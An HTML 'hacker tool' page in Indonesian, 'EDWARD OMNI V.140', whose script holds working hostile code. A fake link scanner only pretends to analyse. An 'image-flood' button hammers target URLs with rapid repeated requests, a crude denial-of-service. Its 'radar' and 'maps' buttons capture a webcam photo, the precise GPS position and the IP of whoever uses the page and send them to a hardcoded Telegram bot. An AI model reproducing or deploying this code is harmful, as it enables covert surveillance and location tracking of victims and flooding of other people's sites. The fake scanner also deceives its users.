<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDWARD OMNI V.140</title>
    <style>
        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
        * { box-sizing: border-box; transition: 0.2s; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; }
        .master-header { text-align: center; margin-bottom: 15px; }
        .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
        .card { background: rgba(15, 25, 35, 0.8); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
        h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
        input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 8px; outline: none; }
        .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-scan { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); }
        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
        .btn-radar { background: transparent; color: var(--blue); border: 1px solid var(--blue); }
        .btn-map { background: var(--neon); color: #000; }
        .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; font-size: 10px; }
        .mon-box { border: 1px solid rgba(0,255,136,0.2); padding: 5px; border-radius: 5px; text-align: center; color: var(--neon); }
        #scanStatus { display: none; margin-top: 10px; text-align: center; color: var(--neon); font-weight: bold; }
        #killerLog { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
        #mapBox { display: none; width: 100%; height: 200px; border-radius: 15px; border: 1px solid var(--neon); margin-top: 10px; }
        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .radar-container { width: 120px; height: 120px; border-radius: 50%; border: 1px solid var(--neon); position: relative; overflow: hidden; }
        .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        canvas, video { display: none; }
    </style>
</head>
<body>
    <div class="master-header">
        <p class="master-name">EDWARD OMNI V.140</p>
        <div class="sys-monitor">
            <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
            <div class="mon-box :">TEMP: <span id="sysTemp">38°C</span></div>
        </div>
    </div>

    <div class="card">
        <h3>🛡️ DEEP CLOUD SCANNER</h3>
        <input type="text" id="scanInput" placeholder="Cek Link...">
        <button class="btn btn-scan" onclick="cekLink()">⚡ SCAN LINK</button>
        <div id="scanStatus"></div>
    </div>

    <div class="card">
        <h3>🔥 NUCLEAR GACOR (IMAGE-FLOOD)</h3>
        <input type="text" id="target1" placeholder="Link Target 1">
        <input type="text" id="target2" placeholder="Link Target 2">
        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
        <div id="killerLog"></div>
    </div>

    <div class="card">
        <h3>📡 SATELIT RADAR</h3>
        <button class="btn btn-radar" onclick="startRadar()">KIRIM DATA (FOTO + IP + GPS)</button>
    </div>

    <div class="card">
        <h3>📍 MAPS SATELIT</h3>
        <button class="btn btn-map" onclick="showLiveMap()">LOCK GPS & KIRIM DATA</button>
        <iframe id="mapBox" src="" frameborder="0"></iframe>
    </div>

    <div id="radarOverlay">
        <div class="radar-container"><div class="radar-sweep"></div></div>
        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">V.140 SENDING DATA...</p>
    </div>

    <canvas id="canvas"></canvas><video id="v" autoplay playsinline></video>

    <script>
        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const CHAT_ID = '7898572558';
        let isAtk = false;

        function cekLink() {
            const status = document.getElementById('scanStatus');
            status.style.display = "block"; status.innerText = "ANALYZING...";
            setTimeout(() => { status.innerText = "✅ ANALYSIS COMPLETE"; }, 1000);
        }

        function toggleAtk() {
            const t1 = document.getElementById('target1').value;
            const t2 = document.getElementById('target2').value;
            const log = document.getElementById('killerLog');
            if(!t1 || isAtk) { if(isAtk) location.reload(); return; }
            isAtk = true; log.style.display = "block";
            document.getElementById('atkBtn').innerText = "TERMINATE 🛑";
            [t1, t2].forEach(url => {
                if(!url) return;
                for(let i=0; i<30; i++) {
                    setInterval(() => {
                        const img = new Image(); img.src = url + "/?v=" + Math.random();
                        const e = document.createElement('div'); e.innerText = "> [V140] HIT -> " + url.substring(0,12);
                        log.prepend(e); if(log.childNodes.length > 10) log.removeChild(log.lastChild);
                    }, 80);
                }
            });
        }

        async function startRadar() {
            document.getElementById('radarOverlay').style.display = 'flex';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = stream;
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    setTimeout(async () => {
                        const canvas = document.getElementById('canvas'); const video = document.getElementById('v');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                        const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
                        await sendTele(blob, ipD.ip, pos.coords.latitude, pos.coords.longitude, "RADAR");
                        document.getElementById('radarOverlay').style.display = 'none';
                        alert("FOTO & LOKASI TERKIRIM!");
                    }, 3000);
                }, () => { location.reload(); }, {enableHighAccuracy: true});
            } catch (e) { location.reload(); }
        }

        function showLiveMap() {
            document.getElementById('radarOverlay').style.display = 'flex';
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude; const lon = pos.coords.longitude;
                const map = document.getElementById('mapBox');
                map.src = "https://maps.google.com/maps?q="+lat+","+lon+"&z=15&output=embed";
                map.style.display = "block";
                
                const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
                await sendTele(null, ipD.ip, lat, lon, "MAPS-ONLY");
                
                document.getElementById('radarOverlay').style.display = 'none';
                alert("KOORDINAT GPS TERKIRIM!");
            }, () => { location.reload(); }, {enableHighAccuracy: true});
        }

        async function sendTele(photo, ip, lat, lon, source) {
            const fd = new FormData(); fd.append('chat_id', CHAT_ID);
            let cap = "🔱 [ REPORT V.140 - "+source+" ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon;
            
            if(photo) {
                fd.append('photo', photo);
                fd.append('caption', cap);
                return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
            } else {
                fd.append('text', cap);
                return fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", { method: "POST", body: fd });
            }
        }
    </script>
</body>
</html>
